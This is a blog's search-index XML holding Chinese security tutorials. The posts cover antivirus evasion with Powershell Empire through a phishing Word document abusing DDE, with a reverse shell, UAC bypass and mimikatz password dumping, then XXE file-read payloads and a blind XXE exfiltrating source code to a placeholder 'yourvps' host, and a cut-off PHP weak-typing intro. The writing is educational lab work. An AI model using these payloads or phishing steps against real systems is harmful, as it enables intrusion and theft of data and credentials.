<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[一次杀软绕过（二）]]></title>
      <url>/2017/11/02/%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC/</url>
      <content type="html"><![CDATA[<h1 id="模拟钓鱼攻击引发的思考"><a href="#模拟钓鱼攻击引发的思考" class="headerlink" title="模拟钓鱼攻击引发的思考"></a>模拟钓鱼攻击引发的思考</h1><p><img src="http://ourd90bac.bkt.clouddn.com/fish.jpg" alt=""></p>
<p>###1. 前言</p>
<p>在上一篇文章“Powershell Empire绕过AV实现远控”中介绍了以powershell作为攻击平台的empire利用前些天曝光的office无宏命令漏洞进行钓鱼攻击，绕过杀软对目标靶机进行远控的例子。事后在继续对实验中恶意代码绕过方式进行进一步思考时有了一点新的理解，接下来将在文章中写明。此篇文章依旧围绕着powershell与杀软的猫捉老鼠的故事进行。</p>
<a id="more"></a>
<h3 id="2-背景介绍"><a href="#2-背景介绍" class="headerlink" title="2. 背景介绍"></a>2. 背景介绍</h3><p><strong>从cmd到powershell</strong><br>学计算机的都应该听说过DOS。dos与cmd很简单又很容易搞混的两个东西。通俗的来讲，dos本来就是一个操作系统，而cmd就只是个应用程序，它是dos的一个实现而已。cmd能实现的命令dos也可以，但是dos能实现的未必在cmd上能实现。作为一直专注于GUI操作系统开发的微软来说，cmd显得并不是那么重要。但是在服务器中一种好的shell是一个能提升管理人员效率的好东西。举例来讲，如果我们要在win系列计算机中创建一个账户，只需要点击鼠标，然后输入账户就可以轻松花费五分钟创建一个新账户，但是要是创建更多的账户，或者更多复杂的操作。系统管理员所要花费的时间就会更长，人性化的GUI操作系统，遇到了瓶颈。尽管微软尝试着用VBScript来配合着弥补这样的缺陷，但是仍旧不能完美地解决这个问题。在这样的背景下，powershell应运而生。关于powershell我就不多赘言，但你要理解它其实为一门脚本语言。</p>
<h3 id="3-杀软与非PE文件"><a href="#3-杀软与非PE文件" class="headerlink" title="3. 杀软与非PE文件"></a>3. 杀软与非PE文件</h3><h4 id="3-1-什么是非PE文件？"><a href="#3-1-什么是非PE文件？" class="headerlink" title="3.1 什么是非PE文件？"></a>3.1 什么是非PE文件？</h4><p>有非PE文件，肯定是有PE文件。什么是PE（Portable Executable）呢？PE文件是一种windows系统 下的可执行文件，具体的文件类型有<code>exe</code>、<code>dll</code>、<code>ocx</code>、<code>sys</code>、<code>com</code>，这些都属于传统的PE文件。win系统可以直接或者间接执行。<br>现在看看非PE文件，其主要分三大类：</p>
<ol>
<li>脚本类。其有包括系统自带和非系统自带。系统自带包括bat、vbs、jscript以及后来加入的powershell。非系统自带包括我们熟知的python、php、java。</li>
<li>文档类。包括我们熟知的office三剑客，word,excel,ppt和另外一个pdf。这四个使我们使用率极高的文档。</li>
<li>其他。包括swf,lnk等类型的文件。</li>
</ol>
<p>####3.2  杀软的查杀策略<br>上述的PE文件在我们平时的使用率最高的文件，自然杀软在进行恶意文件的查杀方面重点就在PE文件上。上一篇文章中我已经介绍过用exe格式的木马进行测试，杀软不负众望，一个不漏的地对其进行了木马隔离。我们可能听过可以dll注入进行反弹shell,但是作为PE文件，dll恶意文件的效果如何呢？这里我们试验下。<br>和往常一样，生成一个恶意的payload1.dll文件。然后放入有杀软的主机。然后在写一个payload1.bat的文件，内容如下：<br><img src="http://ourd90bac.bkt.clouddn.com/2.jpg" alt=""><br>此文件的目的就是让系统调用rundll.exe这个程序执行我们的恶意payload1.dll文件，从而达到反弹shell的目的。但是如何让受害者在毫无戒心的情况下执行bat文件呢？我这里使用了rar可生成<em>自解压</em>压缩包的功能，并且将bat文件设为自动执行，这样就可以让受害者在点击压缩包的一瞬间执行我们的恶意dll文件<br><img src="http://ourd90bac.bkt.clouddn.com/3.jpg" alt=""><br>最后生成自解压压缩包。如图：<br><img src="http://ourd90bac.bkt.clouddn.com/4.jpg" alt=""></p>
<p>我本以为这样就可以巧妙地绕过杀软和用户，但是并不是。这个压缩包在生成后不久就被杀软查杀。这种方法显然不行，也证明杀软在PE文件内容上的检测已经是很强并且可靠的。那么对于非PE文件呢？</p>
<h4 id="3-3-杀软与非PE文件"><a href="#3-3-杀软与非PE文件" class="headerlink" title="3.3 杀软与非PE文件"></a>3.3 杀软与非PE文件</h4><p>一样的，我们先生成一个含有恶意powershell代码的bat文件试一试。<br><img src="http://ourd90bac.bkt.clouddn.com/bat-1.jpg" alt=""><br>以文本方式打开，我们可以看到base64编码的恶意代码，然后将其拖入目标机。这时杀软报毒了<br><img src="http://ourd90bac.bkt.clouddn.com/bat2.jpg" alt=""></p>
<p>看来对于非PE文件的内容检测也是很严格的。</p>
<p>但是我们再来回顾下无宏office命令执行漏洞的恶意代码，也许我们有新的发现<br><img src="http://ourd90bac.bkt.clouddn.com/ok.jpg" alt=""></p>
<p>在我看来，这段恶意利用代码其实可以拆分成两个区域：一是office的DDE协议漏洞的区域，它的主要功能是从word直接调用cmd.exe。二是后面的powershell正常的命令区，这个区域属于psl的正常语法，是psl解释器要解释的东西。而我们真正的恶意代码却在世界的另一端—-网站上。所以其能绕过杀软的检测，成功反弹shell。那既然这样，我们是不是可以举一反三？</p>
<p>于是，我们将psl区的代码写入一个bat文件中，然后直接双击执行。注意，这个bat文件并没有耳音代码，只有恶意的链接。你猜结果会怎样？<br><img src="http://ourd90bac.bkt.clouddn.com/789456.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/sucess.jpg" alt=""><br>成功侦听，最后故技重施。</p>
<h3 id="4-一点点小建议"><a href="#4-一点点小建议" class="headerlink" title="4. 一点点小建议"></a>4. 一点点小建议</h3><p>通过实验可以看出，我们的杀软已经很强悍了，对于恶意代码基本上都可以识别出来，但是对于这种恶意钓鱼链接依旧不敏感。如果以后杀软可以对于钓鱼链接能够很好识别，那就更棒了。</p>
]]></content>
      
        
        <tags>
            
            <tag> 杀软 </tag>
            
            <tag> 病毒 </tag>
            
            <tag> powershell </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一次杀软绕过（一）]]></title>
      <url>/2017/11/02/%E4%B8%80%E6%AC%A1%E6%9D%80%E8%BD%AF%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<h1 id="Powershell-Empire-绕过AV实现远控"><a href="#Powershell-Empire-绕过AV实现远控" class="headerlink" title="Powershell Empire 绕过AV实现远控"></a>Powershell Empire 绕过AV实现远控</h1><p><img src="http://ourd90bac.bkt.clouddn.com/powershell.jpg" alt=""></p>
<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>谁都喜欢框架。无论对于是平时出于各种目的游走在网页和服务器中的黑客，还是从事网络安全测试的安全人员来说，一个好的漏洞框架发挥的作用不言而喻。这其中的<code>Metasploit</code>脱颖而出。虽然这款框架集成了从漏洞发现到漏洞利用的几乎所有功能，但是不得不承认其在木马后门的免杀方面现如今已经不足以应付一些流氓杀软了。但是，<code>Powershell Empire</code>可以。本篇文章是笔者在一次偶然的机会中接触到<code>powershell empire</code>后进行简单初步的摸索，由于关于这款工具的文章很少，大部分都没有涉及到里面模块作用和原理，官方文档能提供的信息也不多。所以我也是尽力把自己理解的写出来，笔者能力有限，更深层次的利用和原理剖析还在逐步进行。请谅解。</p>
<a id="more"></a>
<h2 id="2-为什么是Powershell"><a href="#2-为什么是Powershell" class="headerlink" title="2. 为什么是Powershell?"></a>2. 为什么是Powershell?</h2><p><code>empire</code>选择了<code>poweeshell</code>作为攻击平台总是有原因的。其作为windows平台下的一种命令行外壳程序和脚本环境，它可以使命令行用户和脚本编写者利用<code>.NET Farmework</code>。<br>说到这里，你可能还是一脸懵逼，我也是，毕竟这只是<code>powershell</code>的官方解释。那我们来看下empire开发者是怎么讲的：<a href="http://www.exploit-monday.com/2012/08/Why-I-Choose-PowerShell.html" target="_blank" rel="external">传送门</a>。其中重要的一段是：”<code>Scripting languages offer an advantage to an attacker because they provide a layer of abstraction that AV has no idea how to interpret. For example, a common AV bypass technique is to package malicious Python scripts into an executable. AV has a hard time distinguishing the resulting binary as malicious or legitimate because the Python interpreter itself has plenty of legitimate uses. PowerShell offers a distinct advantage in this scenario due to its tight integration with the Windows OS and considering it’s based upon the .NET framework. With such a powerful scripting environment, there is no need to drop files on disk. Everything, with the possible exception of the script itself run entirely memory-resident.</code>“</p>
<blockquote>
<p>大致意思是：脚本语言为攻击者提供了一个优势，因为它们提供了一个抽象层，杀软（AV）不知道如何解释。例如，常见的杀软旁路技术是将恶意Python脚本打包成可执行文件。杀软很难将生成的二进制文件区分为恶意的或合法的，因为Python解释器本身有很多合法用途。PowerShell在这种情况下提供了明显的优势，因为它与Windows操作系统的紧密集成，并考虑到它基于.NET框架。使用如此强大的脚本环境，不需要将文件放在磁盘上。所有的东西，除了脚本本身的可能例外，它完全是内存驻留的。</p>
</blockquote>
<p><code>no need to drop files on disk</code>:无需写入硬盘，内存驻留。<code>empire</code>使攻击者能在内存中运行命令，也就是empire使用powershell作为攻击平台，并且有<strong>大概率</strong>成功绕过AV的原因。</p>
<blockquote>
<p>这种内存中运行的命令是否会让后来的入侵取证出现困难？这个我还未咨询相关的大佬和老师，暂时就不得而知了。</p>
</blockquote>
<p>##3.  初识Empire<br>和<code>Metasploit</code>一样，<code>empire</code>集成了对主机控制提权，内网主机探测等主流的渗透测试功能。</p>
<p>其重要的由四大部分：<code>listeners</code>（侦听器）、<code>stagers</code>（驿站）、<code>agents</code>（会话代理）、<code>modules</code>（模块）</p>
<ul>
<li><code>listeners</code>相当于msf中的监听模块，用来设置本地IP进行会话监听的。</li>
<li><code>stargers</code>就是一段恶意代码，它通过本机的会话代理（agent）实现本机与被攻击主机的会话通道。</li>
<li><code>agents</code>相当于msf中的<code>session</code>，当我们在被攻击主机上成功执行恶意代码（即木马后门） 时，会反弹一个shell，并通过agent构建本地和被害主机会话。</li>
<li><code>modules</code>这是一个我们在控制了目标主机后，对目标内网或域进行渗透所要使用的主要模块，其包含了很多功能，具体的笔者还在摸索中。</li>
</ul>
<p>###3.1  配置侦听器（Listener）<br>使用<code>listeners</code>命令，加载当前活动的侦听器。没有的话也会提示你。你可以输入<code>help</code>查看帮助，选择Listeners下可以使用的命令。这里我们首先创建一个活动的侦听器。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners) &gt; uselistener</div></pre></td></tr></table></figure></p>
<p><code>TAB</code>键弹出可用的侦听建立途径<br><img src="http://ourd90bac.bkt.clouddn.com/begin.jpg" alt=""><br>从图中可以看出具体有七种侦听途径建立方式，其中有五种是通过<code>http</code>协议进行建立通信的，他们之间具体的差别主要在于目标主机的第三方软件配置的差别，关于这一点，<code>empire</code>的官方文档给出了解释：<a href="http://www.powershellempire.com/?page_id=102" target="_blank" rel="external">传送门</a>。剩下的是我们熟悉的msf中常用的<code>meterpreter</code>以及使用条件需要目标主机安装第三方软件<code>dropbox</code>的dbx途径。这里我们选择比较通用的<code>http</code>通道。使用info查看详细配置信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners) &gt; uselistener http</div><div class="line">(Empire: listeners/http) &gt; info</div></pre></td></tr></table></figure>
<p>然后进行配置：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Host 192.168.1.144</div><div class="line">(Empire: listeners/http) &gt; <span class="built_in">set</span> Port 1234</div></pre></td></tr></table></figure></p>
<p>然后execute生成侦听<br><img src="http://ourd90bac.bkt.clouddn.com/1.jpg" alt=""><br>然后main指令回到主菜单，可以看到一个侦听已经激活。listener列表显示详细信息。<br><img src="http://ourd90bac.bkt.clouddn.com/listen_ok.jpg" alt=""></p>
<h3 id="3-1-配置Stagers"><a href="#3-1-配置Stagers" class="headerlink" title="3.1 配置Stagers"></a>3.1 配置Stagers</h3><p>配置好侦听后就要配置我们的攻击代码了，也就是木马后门。使用<code>usestager</code>命令<code>TAB</code>键可以看到所有根据不同系统的生成木马后门的文件类型。<br><img src="http://ourd90bac.bkt.clouddn.com/stager1.jpg" alt=""><br>其中<code>multi</code>为通用模块、<code>osx</code>mac操作系统、另外还有<code>linux</code>与<code>windows</code>模块。<br>生成的文件类型有<code>.dll</code>,<code>bat</code>，<code>vbs</code>等等。其中就包括前段时间office宏命令漏洞的主角<code>windos/macro</code>模块。详情点击：<a href="http://bobao.360.cn/learning/detail/3605.html" target="_blank" rel="external">传送门</a>。</p>
<p>实战中直接命令<code>usestager [具体模块]</code>就可以在<code>/tmp</code>目录下生成一个特定文件格式的木马后门，然后通过webshell上传运行就可以了。这里因为演示需要就不进行具体文件生成，直接使用<code>launcher</code>+语言类型（这里是powershell）+侦听的名字（这里是侦听的默认名字是http，也可以在设置侦听时自己更改），如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire) &gt; launcher powershell http</div></pre></td></tr></table></figure></p>
<p>生成一个powershell语言的内容,直接在powershell目录下执行就行了:<br><img src="http://ourd90bac.bkt.clouddn.com/begin_poershell.jpg" alt=""></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/ps3.jpg" alt=""><br>运行，发现杀软并没有有明显变化，但也并不能证明其免杀效果，因为不清楚杀软是否对powershell的行为流量进行监控。</p>
<h4 id="3-1-1-由此衍生的骚操作"><a href="#3-1-1-由此衍生的骚操作" class="headerlink" title="3.1.1 由此衍生的骚操作"></a>3.1.1 由此衍生的骚操作</h4><p>从上面这里我们可以看到执行恶意的 powershell命令时杀软并没有给出任何报毒反映，那么我们在此基础上进一步将这个利用点扩大化，进行一次模拟网络钓鱼。如何实现？这里我们就要用到最近才出现的office<code>无宏命令执行漏洞</code>了。前几天国内已经有人翻译了原文：<a href="http://bobao.360.cn/learning/detail/4526.html" target="_blank" rel="external">传送门</a>。这个office漏洞的原理简单的说就是，在office中可以通过一种存在于windows内部程序进行数据动态交换的<code>DDE</code>协议进行命令执行，从而达到调用windows内其他程序的目的。看到这里，你应该有点想法了。没错，我们就是用这个命令执行的漏洞，执行我们前面的<code>powershell恶意命令</code>,看会不会有我们想要的那种效果。</p>
<ol>
<li>先将上面生成的攻击代码写成psl文本，放入本地lamp环境根目录：<br><img src="http://ourd90bac.bkt.clouddn.com/apache.jpg" alt=""></li>
<li>编写钓鱼的word文档：<br><img src="http://ourd90bac.bkt.clouddn.com/ps.jpg" alt=""></li>
<li>先用 杀软扫下有没有报毒，再发送至虚拟机。这里因为虚拟机的win7没有word，我就暂时以我的物理机来实验吧（拼了）<br>结果杀软未报毒<br>最终，反弹了自己物理机的shell…………..<br><img src="http://ourd90bac.bkt.clouddn.com/myself.jpg" alt=""></li>
</ol>
<p>再此过程中杀软除了powershell启动的一瞬间给了一次见惯不怪的警告（原来警告确实重要！），之后的会话一直没结束。成功验证操作。</p>
<p>言归正传，此时，<code>empire</code>的agent已有反应，远控回话已开启。此时，我们使用命令<code>interact</code>进入已经建立的会话名。<br><img src="http://ourd90bac.bkt.clouddn.com/in_shell.jpg" alt=""><br>help查看我们在已建立的会话中所能使用的命令，查看目标主机信息。<br><img src="http://ourd90bac.bkt.clouddn.com/system%20info.jpg" alt=""></p>
<p>能成功执行，继续深入，使用<code>mimikatz</code>命令可以查看目标主机的用户名以及密码，但是我么可以看到这里失败了。<br><img src="http://ourd90bac.bkt.clouddn.com/pass1.jpg" alt=""><br>爆出了<code>needs to elevated content</code>的错误，这里大家应该明白需要提权了。那么<code>empire</code>有没类似于msf中的提权命令呢？有的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(Empire PHWC8BT4) &gt;bypassuac [侦听名]</div></pre></td></tr></table></figure></p>
<p><img src="http://ourd90bac.bkt.clouddn.com/pass2.jpg" alt=""><br>就可以进行提权。</p>
<blockquote>
<p>但是如果运气不好也会出现提权不成功的情况。刚刚说过它和msf一样有相应的提权方式，<code>empire</code>中的<code>module</code>模块中含有相应的扫描模块可以在一键命令提权失败的情况下，进行扫描，找出对应的提权方法，这是后话了。虽然它和msf在提权上的成功率上的比较，笔者还没比较过，但应该是有差别的。</p>
</blockquote>
<p>list列出提权后的会话列表，发现多出一个和原来会话主机名相同，但<code>Username</code>前多一个星号的会话，这个带星号的用户就是提权后的高权限用户了。我们现在interact进入这个高权限用户的会话中，查看用户密码。<br><img src="http://ourd90bac.bkt.clouddn.com/password.jpg" alt=""></p>
<p>可以看出，提权后我们可以对目标主机进行更多的操作，可以直接找出目标的用户名和密码的hash，如果用户密码是弱口令的话，甚至可以直接爆出密码明文。接着如果目标主机有其他内网主机的话就可以进一步地“为所欲为”了。</p>
<blockquote>
<p>在控制目标主机后，我们可以将这个会话发送给msf，使用<code>meterpreter</code>进行更多操作。</p>
</blockquote>
<h1 id="4-我们的杀软在做什么"><a href="#4-我们的杀软在做什么" class="headerlink" title="4. 我们的杀软在做什么"></a>4. 我们的杀软在做什么</h1><p>首先实验一开始，我们使用了恶意的powershell的命令进行攻击。杀软并没有进行报错，毫无反应，证明杀软暂时对Powershell的执行并没有多少设防，但此时我们的攻击端也未进入agent会话，因为不懂杀软是怎样基于行为进行查杀的，所以我们暂时不能说明它不可以拦截恶意行为。<br>而后，攻击端interact连接进会话，攻击机和目标靶机形成数据交互，而且是我们通过http通道建立的。我们再看看目标靶机，依旧毫无反应，这其实很奇怪了，现在的杀软既然已经开始对于电脑中的可以行为进行检测，特别是这种很有疑点的外部通讯，应该是重点查杀的对象，但这里杀软并没有给出任何反应。难道是因为我们的侦听模块是使用的http通道？大胆猜测下，应该是的。<br>接下来的操作目标靶机的杀软都没有反应。到了提权的那一步我就开始使用杀软进行主动扫描，按照杀软的描述，其对磁盘和内存进程都会扫描。但是结果提醒我是安全的。</p>
<p>一片绿色，完全没有问题。就和我们前面的钓鱼一样，木马后门如入无人之境。<br>为了体现这种powershell马的特点和优势，我有生成了几个msf下典型的木马，其中包括未经过编码处理的木马，经过<code>encode</code>十多次的木马和加壳木马，无一例外被杀软查杀，只是后两种有概率在种入木马时运行前不会报毒，但是在运行时，无一例外均被杀。甚至加壳的马会直接被我物理机上的杀软查出。</p>
<h1 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h1><p><code>empire</code>虽然已经比较强大了，但是使用工具的意义并不是它能给我们带来的效益和那种快感，其真正意义在于研究其背后所利用的漏洞原理。这里利用powershell进行攻击，并建立有效的攻击机与目标机的连接，最吸引人的是原始开发者的思路，这才是<code>empire</code>带给我最大的收获。顺着这个思路似乎已经有其他发现了。</p>
<blockquote>
<p>该文写于10月中旬，此漏洞利用过程杀软现已具备查杀功能。该文已同过360安全客平台发表,<a href="http://m.bobao.360.cn/learning/appdetail/4643.html" target="_blank" rel="external">http://m.bobao.360.cn/learning/appdetail/4643.html</a></p>
</blockquote>
]]></content>
      
        
        <tags>
            
            <tag> 杀软 </tag>
            
            <tag> 病毒 </tag>
            
            <tag> powershell </tag>
            
            <tag> 网络钓鱼 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XML实体注入]]></title>
      <url>/2017/10/19/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h1><p><img src="http://ourd90bac.bkt.clouddn.com/XML.jpg" alt=""></p>
<blockquote>
<p>感谢chybeta大佬，他的博客让我对这个知识点有很深入的认识。<br><a id="more"></a></p>
<p>##1. 基础引入</p>
</blockquote>
<h3 id="1-1什么是XML？"><a href="#1-1什么是XML？" class="headerlink" title="1.1什么是XML？"></a>1.1什么是XML？</h3><p>XML是一种可扩展标记语言（英语：Extensible Markup Language，简称：XML），是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML。被设计用来传输和存储数据。</p>
<h3 id="1-2基础语法"><a href="#1-2基础语法" class="headerlink" title="1.2基础语法"></a>1.2基础语法</h3><p>和HTML一样作为一种标记语言，XML也具有传统标记语言的特色。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>C1em0<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>XML-inject<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面的代码中可以看到出，xml语言有着我们熟悉的标签。在第一行是xml的版本和编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<note>是整个文档的根元素。嵌套在note标签中的<to>和<from>则是根的子元素。</from></to></note></p>
<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
<h3 id="1-3XML实体"><a href="#1-3XML实体" class="headerlink" title="1.3XML实体"></a>1.3XML实体</h3><p>实体作为XML中五种简单模块中的一种，    因其用于定义与引用普通文本或者特殊字符，且实体可在内部和外部声明，所以利用其引用的特点就可以构造payload进行攻击。</p>
<h2 id="2-文档定义类型DTD"><a href="#2-文档定义类型DTD" class="headerlink" title="2.文档定义类型DTD"></a>2.文档定义类型DTD</h2><p>DTD的作用是定义XML文档的合法构建模块。利用DTD来内部或外部引入实体。</p>
<p>它的基本格式为：<code>&lt;!DOCTYPE 根元素名 [元素的描述]&gt;</code></p>
<h3 id="2-1内部引入"><a href="#2-1内部引入" class="headerlink" title="2.1内部引入"></a>2.1内部引入</h3><p>首先确定格式：&lt;!ENTITY 实体名称 “实体的值”&gt;</p>
<p>现在我们将DTD与XML放在同一个文档中，即构成了实体的内部引入：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  C1em0  "This is an internally introduced entity"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;C1em0;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>直接访问该文档，&amp;C1em0就会被解析为“This is an internally introduced entity”并输出。</p>
<h3 id="2-2外部引入"><a href="#2-2外部引入" class="headerlink" title="2.2外部引入"></a>2.2外部引入</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code></p>
<p>其与内部引入只是多了<code>system</code>与目标的<code>uri</code>，也就是目录。讲到这里应该可以知道xml实体注入攻击的主要目的是进行对目标的目录内容读取，目录遍历。其实也可以利用外部引入进行SSRF攻击。</p>
<p>##3. 应用</p>
<p>###3.1 一般的XXE攻击</p>
<p>测试代码为test.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">	 print_r((string)$xml);</div></pre></td></tr></table></figure></p>
<blockquote>
<p>这里的<code>simplexml_load_string</code>是将xml文本生成一个对象。</p>
</blockquote>
<p>上面说过，xxe攻击的形式一般是读取源码，所以这里就要一些读取文件的协议，最常用的就是<code>file</code>协议。</p>
<p>现在在windows环境下读取c盘下的target.txt文件，payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://target.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p>将payload进行url编码，然后攻击<br><img src="http://ourd90bac.bkt.clouddn.com/xxe1.jpg" alt=""><br>读取目标文本。</p>
<p>这是在win下，如果换在<code>linux</code>下我们可以直接用于读取用户密码<code>file:///etc/passwd</code></p>
<p>接下来进行读取php文件，需要注意的是，因为php中含有<code>&lt;,&gt;</code>这样的括号，所以会和xml代码有冲突，所以在读取php、html文档时会导致解析错误。如果要正确读取php文档，我们可以用php中的<code>php://filter</code>协议。<br>payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://ourd90bac.bkt.clouddn.com/xxe2.jpg" alt=""><br><img src="http://ourd90bac.bkt.clouddn.com/xxe3.jpg" alt=""></p>
<h3 id="3-2-Blind-XXE"><a href="#3-2-Blind-XXE" class="headerlink" title="3.2 Blind XXE"></a>3.2 Blind XXE</h3><p>当源码为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div></pre></td></tr></table></figure></p>
<p>也就是没有了回显，这种时候该怎么办呢？接下来就需要vps作为辅助了。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=test.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
<p>vps上的xxe.xml：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;&gt;"&gt;</div></pre></td></tr></table></figure></p>
<p>上述代码在DTD中定义了一个<code>file</code>实体和<code>dtd</code>实体，其中<code>file</code>实体是我们要读取的目标服务器网站的源码。<code>dtd</code>实体是引用vps上的xxe.xml文件。之后我们先引用<code>dtd</code>实体，然后在xxe.xml文件中的<code>all</code>实体，进而调用<code>send</code>实体，再调用payload中的<code>file</code>实体。最终构成了一条从vps上访问目标网站的请求,从而可以从vps上的日志直接看到目标网站上的目标文件源码。</p>
]]></content>
      
        
        <tags>
            
            <tag> XML </tag>
            
            <tag> 注入 </tag>
            
            <tag> 源码读取 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF中的php弱类型]]></title>
      <url>/2017/10/10/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<h1 id="PHP弱类型在CTF中的应用"><a href="#PHP弱类型在CTF中的应用" class="headerlink" title="PHP弱类型在CTF中的应用"></a>PHP弱类型在CTF中的应用</h1><p><img src="http://ourd90bac.bkt.clouddn.com/14.jpg" alt=""></p>
<blockquote>
<p>如果你经常接触到CTF比赛，那么你一定对php代码审计的题不会陌生。本篇文章将由CTF比赛引申对php弱类型进行一些总结。</p>
</blockquote>
<a id="more"></a>
<h2 id="基础引入"><a href="#基础引入" class="headerlink" title="基础引入"></a>基础引入</h2><h3 id="什么是php弱类型"><a href="#什么是php弱类型" class="headerlink" title="什么是php弱类型"></a>什么是php弱类型</h3><p>php在变量的声明时不需要直接声明变量的类型，而变量的类型是由程序的上下文决定的。</p>
<h3 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h3><p>php中只存在，整型、浮点型、布尔、NULL型变量的转换。但是特别注意，一般在自动转换时通常是后两者转换为前两者。</p>
<p>布尔值参与运算时，TRUE转换为整型1，FALSE转换为整型0运算。</p>
